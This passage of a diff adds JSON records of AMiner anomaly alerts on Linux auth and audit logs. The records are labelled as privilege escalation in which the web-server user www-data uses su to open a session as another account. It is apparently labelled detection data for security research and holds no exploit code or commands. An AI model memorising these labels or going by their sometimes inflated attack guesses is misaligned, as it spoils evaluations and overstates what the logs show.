+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/service/su\", \"/model/service/su/systemd_str\", \"/model/service/su/id\", \"/model/service/su/brack_str2\", \"/model/service/su/fm/seq2\", \"/model/service/su/fm/seq2/plus\", \"/model/service/su/fm/seq2/msg\"]}, \"LogData\": {\"RawLogData\": [\"Jan 18 13:14:31 intranet-server su[28816]: + /dev/pts/1 www-data:phopkins\"], \"Timestamps\": [1642511671], \"DetectionTimestamp\": [1642511671], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/auth.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Privilege Escalation",
+      "Credential Access"
+    ],
+    "attack_type": "privilegeescalation",
+    "description": "PAM (Pluggable Authentication Modules) session opened for user 'phopkins' by (uid=33), which is typically the 'www-data' user. This confirms that the 'www-data' user successfully authenticated and opened a session as 'phopkins'. This is a strong indicator of privilege escalation by an attacker who has compromised the web server process.",
+    "tools": [
+      "Linux privilege escalation exploits",
+      "PAM bypass techniques"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/service/su\", \"/model/service/su/systemd_str\", \"/model/service/su/id\", \"/model/service/su/brack_str2\", \"/model/service/su/fm/seq\", \"/model/service/su/fm/seq/brack_str\", \"/model/service/su/fm/seq/name\", \"/model/service/su/fm/seq/session_str\", \"/model/service/su/fm/seq/status\", \"/model/service/su/fm/seq/user_str\", \"/model/service/su/fm/seq/user\", \"/model/service/su/fm/seq/uid\", \"/model/service/su/fm/seq/uid/uid\", \"/model/service/su/fm/seq/uid/uid/uid_str\", \"/model/service/su/fm/seq/uid/uid/uid\", \"/model/service/su/fm/seq/uid/uid/brack_str\"]}, \"LogData\": {\"RawLogData\": [\"Jan 18 13:14:31 intranet-server su[28816]: pam_unix(su:session): session opened for user phopkins by (uid=33)\"], \"Timestamps\": [1642511671], \"DetectionTimestamp\": [1642511671], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/auth.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Privilege Escalation",
+      "Authentication Bypass"
+    ],
+    "attack_type": "privilegeescalation",
+    "description": "Audit log entry showing 'USER_AUTH' with 'op=PAM:authentication' for 'phopkins' by '/bin/su' with uid=33 (www-data) and 'res=success'. This explicitly confirms a successful PAM authentication event where the web server user 'www-data' authenticated as 'phopkins' using the 'su' command. This is a critical event indicating privilege escalation following a web server compromise.",
+    "tools": [
+      "Linux privilege escalation exploits",
+      "Exploited web application vulnerabilities"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 20, \"AnalysisComponentType\": \"NewMatchPathValueComboDetector\", \"AnalysisComponentName\": \"AMiner: New user_auth parameter combination in Audit logs.\", \"Message\": \"New value combination(s) detected\", \"PersistenceFileName\": \"nmpvcd_user_auth\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/type/user_auth/uid\", \"/model/type/user_auth/msg2\", \"/model/type/user_auth/fm/acct/acct\", \"/model/type/user_auth/opt/opt_seq/exe\"], \"AffectedLogAtomValues\": [\"33\", \"'op=PAM:authentication\", \"\\\"phopkins\\\"\", \"\\\"/bin/su\\\"\"]}, \"LogData\": {\"RawLogData\": [\"type=USER_AUTH msg=audit(1642511671.635:2441): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=\\\"phopkins\\\" exe=\\\"/bin/su\\\" hostname=? addr=? terminal=/dev/pts/1 res=success'\"], \"Timestamps\": [1642511671.63], \"DetectionTimestamp\": [1642511671.63], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/audit/audit.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Privilege Escalation",
+      "Account Manipulation"
+    ],
+    "attack_type": "privilegeescalation",
+    "description": "Audit log entry showing 'USER_ACCT' with 'op=PAM:accounting' for 'phopkins' by '/bin/su' with uid=33 (www-data) and 'res=success'. This confirms that accounting procedures were successfully performed for the 'su' operation. This activity is part of the privilege escalation sequence where 'www-data' is gaining control of the 'phopkins' user account.",
+    "tools": [
+      "Linux privilege escalation exploits",
+      "Post-exploitation frameworks"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 19, \"AnalysisComponentType\": \"NewMatchPathValueComboDetector\", \"AnalysisComponentName\": \"AMiner: New user_acct parameter combination in Audit logs.\", \"Message\": \"New value combination(s) detected\", \"PersistenceFileName\": \"nmpvcd_user_acct\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/type/user_acct/uid\", \"/model/type/user_acct/msg2\", \"/model/type/user_acct/fm/acct/acct\", \"/model/type/user_acct/opt/opt_seq/exe\"], \"AffectedLogAtomValues\": [\"33\", \"'op=PAM:accounting\", \"\\\"phopkins\\\"\", \"\\\"/bin/su\\\"\"]}, \"LogData\": {\"RawLogData\": [\"type=USER_ACCT msg=audit(1642511671.635:2442): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:accounting acct=\\\"phopkins\\\" exe=\\\"/bin/su\\\" hostname=? addr=? terminal=/dev/pts/1 res=success'\"], \"Timestamps\": [1642511671.63], \"DetectionTimestamp\": [1642511671.63], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/audit/audit.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Privilege Escalation",
+      "Credential Access"
+    ],
+    "attack_type": "privilegeescalation",
+    "description": "Audit log entry showing 'CRED_ACQ' with 'op=PAM:setcred' for 'phopkins' by '/bin/su' with uid=33 (www-data) and 'res=success'. This confirms that the credentials for 'phopkins' were successfully acquired or set during the 'su' operation. This is a direct indication of credential access as part of a privilege escalation attack.",
+    "tools": [
+      "Linux privilege escalation exploits",
+      "Credential dumping tools"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 25, \"AnalysisComponentType\": \"NewMatchPathValueComboDetector\", \"AnalysisComponentName\": \"AMiner: New cred_acq parameter combination in Audit logs.\", \"Message\": \"New value combination(s) detected\", \"PersistenceFileName\": \"nmpvcd_cred_acq\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/type/cred_acq/uid\", \"/model/type/cred_acq/msg2\", \"/model/type/cred_acq/fm/acct/acct\", \"/model/type/cred_acq/opt/opt_seq/exe\"], \"AffectedLogAtomValues\": [\"33\", \"'op=PAM:setcred\", \"\\\"phopkins\\\"\", \"\\\"/bin/su\\\"\"]}, \"LogData\": {\"RawLogData\": [\"type=CRED_ACQ msg=audit(1642511671.663:2443): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\\\"phopkins\\\" exe=\\\"/bin/su\\\" hostname=? addr=? terminal=/dev/pts/1 res=success'\"], \"Timestamps\": [1642511671.66], \"DetectionTimestamp\": [1642511671.66], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/audit/audit.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Privilege Escalation",
+      "Execution"
+    ],
+    "attack_type": "privilegeescalation",
+    "description": "Audit log entry showing 'USER_START' with 'op=PAM:session_open' for 'phopkins' by '/bin/su' with uid=33 (www-data) and 'res=success'. This is the final confirmation of a successful interactive session being opened for user 'phopkins' by the 'www-data' user via 'su'. This signifies a complete privilege escalation, allowing the attacker to execute commands as the 'phopkins' user.",
+    "tools": [
+      "Linux privilege escalation exploits",
+      "Command-line interpreters (e.g., bash)"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 18, \"AnalysisComponentType\": \"NewMatchPathValueComboDetector\", \"AnalysisComponentName\": \"AMiner: New user_start parameter combination in Audit logs.\", \"Message\": \"New value combination(s) detected\", \"PersistenceFileName\": \"nmpvcd_user_start\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/type/user_start/uid\", \"/model/type/user_start/msg2\", \"/model/type/user_start/fm/acct/acct\", \"/model/type/user_start/opt/opt_seq/exe\"], \"AffectedLogAtomValues\": [\"33\", \"'op=PAM:session_open\", \"\\\"phopkins\\\"\", \"\\\"/bin/su\\\"\"]}, \"LogData\": {\"RawLogData\": [\"type=USER_START msg=audit(1642511672.403:2449): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:session_open acct=\\\"phopkins\\\" exe=\\\"/bin/su\\\" hostname=? addr=? terminal=/dev/pts/1 res=success'\"], \"Timestamps\": [1642511672.4], \"DetectionTimestamp\": [1642511672.4], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/audit/audit.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}"
+  }
+]
